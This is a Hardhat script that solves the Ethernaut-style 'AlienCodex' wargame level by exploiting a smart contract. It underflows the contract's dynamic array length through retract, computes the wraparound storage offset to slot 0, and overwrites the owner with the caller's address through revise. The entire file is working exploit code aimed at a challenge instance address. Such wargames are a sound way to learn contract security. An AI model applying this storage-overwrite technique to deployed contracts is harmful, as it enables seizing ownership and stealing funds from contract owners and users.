const { ethers } = require("hardhat");

async function main() {
  const [owner, otherAccount] = await ethers.getSigners();
  // attach your instance address
  const Instance = "0xfDEc84079b3D63C231124eE98712926d396A19B4";
  const AlienCodexContract = await ethers.getContractFactory("AlienCodex");
  const AlienCodex = AlienCodexContract.attach(Instance);
  const Owner = await AlienCodex.owner();
  await AlienCodex.make_contact();
  await AlienCodex.retract();
  const start = ethers.BigNumber.from(
    ethers.utils.keccak256(
      `0x0000000000000000000000000000000000000000000000000000000000000001`
    )
  );
  const ownerOffset = ethers.BigNumber.from(`2`).pow(`256`).sub(start);
  const tx = await AlienCodex.revise(
    ownerOffset,
    ethers.utils.zeroPad(owner.address, 32)
  );
  await tx.wait();
  const ownerChange = await ethers.provider.getStorageAt(AlienCodex.address, 0);
  console.log(ownerChange, "ownerChange");
  const updatedOwner = await AlienCodex.owner();
  console.log(Owner, updatedOwner);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
